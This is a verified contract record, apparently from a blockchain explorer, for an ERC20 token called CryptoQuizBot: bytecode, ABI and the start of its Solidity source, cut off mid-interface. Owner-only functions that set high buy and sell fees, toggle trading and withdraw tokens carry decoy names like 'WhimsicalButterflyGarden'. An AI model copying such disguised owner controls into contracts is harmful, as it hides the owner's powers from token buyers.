4565b9250506020613d8585828601613d3d565b9150509250929050565b5f8060408385031215613da557613da4613b0a565b5b5f613db285828601613b24565b9250506020613dc385828601613b24565b9150509250929050565b5f60208284031215613de257613de1613b0a565b5b5f613def84828501613b24565b91505092915050565b5f805f60608486031215613e0f57613e0e613b0a565b5b5f613e1c86828701613b57565b9350506020613e2d86828701613b57565b9250506040613e3e86828701613b57565b9150509250925092565b5f60208284031215613e5d57613e5c613b0a565b5b5f613e6a84828501613d3d565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f6002820490506001821680613eb757607f821691505b602082108103613eca57613ec9613e73565b5b50919050565b7f45524332303a207472616e7366657220616d6f756e74206578636565647320615f8201527f6c6c6f77616e6365000000000000000000000000000000000000000000000000602082015250565b5f613f2a602883613a12565b9150613f3582613ed0565b604082019050919050565b5f6020820190508181035f830152613f5781613f1e565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f613f92602083613a12565b9150613f9d82613f5e565b602082019050919050565b5f6020820190508181035f830152613fbf81613f86565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f613ffd82613b38565b915061400883613b38565b925082820261401681613b38565b9150828204841483151761402d5761402c613fc6565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61406b82613b38565b915061407683613b38565b92508261408657614085614034565b5b828204905092915050565b7f43616e6e6f7420736574206d61785478416d6f756e74206c6f776572207468615f8201527f6e20302e35250000000000000000000000000000000000000000000000000000602082015250565b5f6140eb602683613a12565b91506140f682614091565b604082019050919050565b5f6020820190508181035f830152614118816140df565b9050919050565b7f5f746f6b656e20616464726573732063616e6e6f7420626520300000000000005f82015250565b5f614153601a83613a12565b915061415e8261411f565b602082019050919050565b5f6020820190508181035f83015261418081614147565b9050919050565b5f8151905061419581613b41565b92915050565b5f602082840312156141b0576141af613b0a565b5b5f6141bd84828501614187565b91505092915050565b5f6040820190506141d95f830185613ae2565b6141e66020830184613c50565b9392505050565b5f815190506141fb81613d27565b92915050565b5f6020828403121561421657614215613b0a565b5b5f614223848285016141ed565b91505092915050565b7f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e5f8201527f20302e3030312520746f74616c20737570706c792e0000000000000000000000602082015250565b5f614286603583613a12565b91506142918261422c565b604082019050919050565b5f6020820190508181035f8301526142b38161427a565b9050919050565b7f5377617020616d6f756e742063616e6e6f7420626520686967686572207468615f8201527f6e20302e352520746f74616c20737570706c792e000000000000000000000000602082015250565b5f614314603483613a12565b915061431f826142ba565b604082019050919050565b5f6020820190508181035f83015261434181614308565b9050919050565b5f61435282613b38565b915061435d83613b38565b925082820190508082111561437557614374613fc6565b5b92915050565b7f4275792066656573206d757374206265203c3d2032352e0000000000000000005f82015250565b5f6143af601783613a12565b91506143ba8261437b565b602082019050919050565b5f6020820190508181035f8301526143dc816143a3565b9050919050565b7f43616e6e6f7420736574206d6178486f6c64696e6773206c6f776572207468615f8201527f6e20312e30250000000000000000000000000000000000000000000000000000602082015250565b5f61443d602683613a12565b9150614448826143e3565b604082019050919050565b5f6020820190508181035f83015261446a81614431565b9050919050565b7f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d205f8201527f6175746f6d617465644d61726b65744d616b6572506169727300000000000000602082015250565b5f6144cb603983613a12565b91506144d682614471565b604082019050919050565b5f6020820190508181035f8301526144f8816144bf565b9050919050565b7f53656c6c2066656573206d757374206265203c3d2034352e00000000000000005f82015250565b5f614533601883613a12565b915061453e826144ff565b602082019050919050565b5f6020820190508181035f83015261456081614527565b9050919050565b7f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f775f8201527f207a65726f000000000000000000000000000000000000000000000000000000602082015250565b5f6145c1602583613a12565b91506145cc82614567565b604082019050919050565b5f6020820190508181035f8301526145ee816145b5565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f20615f8201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b5f61464f602683613a12565b915061465a826145f5565b604082019050919050565b5f6020820190508181035f83015261467c81614643565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f206164645f8201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b5f6146dd602483613a12565b91506146e882614683565b604082019050919050565b5f6020820190508181035f83015261470a816146d1565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f2061646472655f8201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b5f61476b602283613a12565b915061477682614711565b604082019050919050565b5f6020820190508181035f8301526147988161475f565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f2061645f8201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b5f6147f9602583613a12565b91506148048261479f565b604082019050919050565b5f6020820190508181035f830152614826816147ed565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f20616464725f8201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b5f614887602383613a12565b91506148928261482d565b604082019050919050565b5f6020820190508181035f8301526148b48161487b565b9050919050565b7f54726164696e67206973206e6f74206163746976652e000000000000000000005f82015250565b5f6148ef601683613a12565b91506148fa826148bb565b602082019050919050565b5f6020820190508181035f83015261491c816148e3565b9050919050565b7f427579207472616e7366657220616d6f756e74206578636565647320746865205f8201527f6d61785478416d6f756e742e0000000000000000000000000000000000000000602082015250565b5f61497d602c83613a12565b915061498882614923565b604082019050919050565b5f6020820190508181035f8301526149aa81614971565b9050919050565b7f4d61782077616c6c6574206578636565646564000000000000000000000000005f82015250565b5f6149e5601383613a12565b91506149f0826149b1565b602082019050919050565b5f6020820190508181035f830152614a12816149d9565b9050919050565b7f53656c6c207472616e7366657220616d6f756e742065786365656473207468655f8201527f206d61785478416d6f756e742e00000000000000000000000000000000000000602082015250565b5f614a73602d83613a12565b9150614a7e82614a19565b604082019050919050565b5f6020820190508181035f830152614aa081614a67565b9050919050565b5f614ab182613b38565b9150614abc83613b38565b9250828203905081811115614ad457614ad3613fc6565b5b92915050565b7f45524332303a207472616e7366657220616d6f756e74206578636565647320625f8201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b5f614b34602683613a12565b9150614b3f82614ada565b604082019050919050565b5f6020820190508181035f830152614b6181614b28565b9050919050565b5f81905092915050565b50565b5f614b805f83614b68565b9150614b8b82614b72565b5f82019050919050565b5f614b9f82614b75565b9150819050919050565b5f606082019050614bbc5f830186613c50565b614bc96020830185613c50565b614bd66040830184613c50565b949350505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f81519050614c4681613b0e565b92915050565b5f60208284031215614c6157614c60613b0a565b5b5f614c6e84828501614c38565b91505092915050565b5f819050919050565b5f614c9a614c95614c9084614c77565b613bdc565b613b38565b9050919050565b614caa81614c80565b82525050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b614ce281613ad1565b82525050565b5f614cf38383614cd9565b60208301905092915050565b5f602082019050919050565b5f614d1582614cb0565b614d1f8185614cba565b9350614d2a83614cca565b805f5b83811015614d5a578151614d418882614ce8565b9750614d4c83614cff565b925050600181019050614d2d565b5085935050505092915050565b5f60a082019050614d7a5f830188613c50565b614d876020830187614ca1565b8181036040830152614d998186614d0b565b9050614da86060830185613ae2565b614db56080830184613c50565b9695505050505050565b5f60c082019050614dd25f830189613ae2565b614ddf6020830188613c50565b614dec6040830187614ca1565b614df96060830186614ca1565b614e066080830185613ae2565b614e1360a0830184613c50565b979650505050505050565b5f805f60608486031215614e3557614e34613b0a565b5b5f614e4286828701614187565b9350506020614e5386828701614187565b9250506040614e6486828701614187565b915050925092509256fea26469706673582212200e351ec77c238d409552b0f247c18ed3887174d12a4af1d3a9188f2ca437b3cb64736f6c63430008150033",
    "contract_name": "CryptoQuizBot",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldWallet\",\"type\":\"address\"}],\"name\":\"GoldenHarvestFieldsUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiquidity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldAddress\",\"type\":\"address\"}],\"name\":\"UpdateUniswapV2Router\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldWallet\",\"type\":\"address\"}],\"name\":\"lotteryWalletUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setAutomatedMarketMakerPair\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"AMMPairSetUniV2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"CrimsonSunsetHorizon\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"updAds\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"isEx\",\"type\":\"bool\"}],\"name\":\"EnchantedForestPath\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"FermionToggleMarketPortal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"GoldenHarvestFields\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"removeValue\",\"type\":\"uint256\"}],\"name\":\"MountainPeakSunrise\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sumValue\",\"type\":\"uint256\"}],\"name\":\"OceanBreezeWave\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"StrideReclaimMislaidResources\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"WhimsicalButterflyGarden\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newNum\",\"type\":\"uint256\"}],\"name\":\"WhisperingWillowMeadowTxnLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"automatedMarketMakerPairs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyDevFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLpFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeamTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotalTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromMaxTxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitsInEffect\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxHoldings\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_lotteryFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_teamFee\",\"type\":\"uint256\"}],\"name\":\"renewTranquilRiverfrontView\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_lotteryFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_teamFee\",\"type\":\"uint256\"}],\"name\":\"reworkMysticalMoonlitGrove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellDevFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeamTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForDev\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForLP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newLotteryWallet\",\"type\":\"address\"}],\"name\":\"updateCrimsonSunsetHorizon\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateGoldenHarvestFields\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newNum\",\"type\":\"uint256\"}],\"name\":\"updateSapphireTwilightLake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"zeroAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/CryptoQuizBot.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n\\n/*\\nTelegram - https://t.me/CryptoQuizBot_ETH\\nWebsite - https://t.me/CryptoQuizBot_ETH\\n*/\\n\\npragma solidity 0.8.21;\\npragma experimental ABIEncoderV2;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\nabstract contract Ownable is Context {\\n    address public _owner;\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n    constructor() {\\n        _owner = msg.sender;\\n    }\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n    modifier onlyOwner() {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n    function allowance(address owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\ninterface IERC20Metadata is IERC20 {\\n    function name() external view returns (string memory);\\n    function symbol() external view returns (string memory);\\n    function decimals() external view returns (uint8);\\n}\\ncontract ERC20 is Context, IERC20, IERC20Metadata {\\n    mapping(address => uint256) internal _balances;\\n    mapping(address => mapping(address => uint256)) private _allowances;\\n    uint256 private _totalSupply;\\n    string private _name;\\n    string private _symbol;\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n    function decimals() public view virtual override returns (uint8) {\\n        return 9;\\n    }\\n    function totalSupply() public view virtual override returns (uint256) {\\n        return _totalSupply;\\n    }\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _balances[account];\\n    }\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) public virtual override returns (bool) {\\n        _transfer(sender, recipient, amount);\\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\\n        require(currentAllowance >= amount, \\\"ERC20: transfer amount exceeds allowance\\\");\\n        unchecked {\\n            _approve(sender, _msgSender(), currentAllowance - amount);\\n        }\\n        return true;\\n    }\\n    function OceanBreezeWave(address spender, uint256 sumValue) public virtual returns (bool) {\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + sumValue);\\n        return true;\\n    }\\n    function MountainPeakSunrise(address spender, uint256 removeValue) public virtual returns (bool) {\\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\\n        require(currentAllowance >= removeValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(_msgSender(), spender, currentAllowance - removeValue);\\n        }\\n        return true;\\n    }\\n    function _transfer(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) internal virtual {\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        _beforeTokenTransfer(sender, recipient, amount);\\n        uint256 senderBalance = _balances[sender];\\n        require(senderBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n        unchecked {\\n            _balances[sender] = senderBalance - amount;\\n        }\\n        _balances[recipient] += amount;\\n        emit Transfer(sender, recipient, amount);\\n        _afterTokenTransfer(sender, recipient, amount);\\n    }\\n    function _mint(address account, uint256 amount) internal virtual {\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\n        _beforeTokenTransfer(address(0), account, amount);\\n        _totalSupply += amount;\\n        _balances[account] += amount;\\n        emit Transfer(address(0), account, amount);\\n        _afterTokenTransfer(address(0), account, amount);\\n    }\\n    function _burn(address account, uint256 amount) internal virtual {\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\n        _beforeTokenTransfer(account, address(0), amount);\\n        uint256 accountBalance = _balances[account];\\n        require(accountBalance >= amount, \\\"ERC20: burn amount exceeds balance\\\");\\n        unchecked {\\n            _balances[account] = accountBalance - amount;\\n        }\\n        _totalSupply -= amount;\\n        emit Transfer(account, address(0), amount);\\n        _afterTokenTransfer(account, address(0), amount);\\n    }\\n    function _approve(\\n        address owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n}\\ninterface IUniswapV2Pair {\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    function name() external pure returns (string memory);\\n    function symbol() external pure returns (string memory);\\n    function decimals() external pure returns (uint8);\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address owner) external view returns (uint256);\\n    function allowance(address owner, address 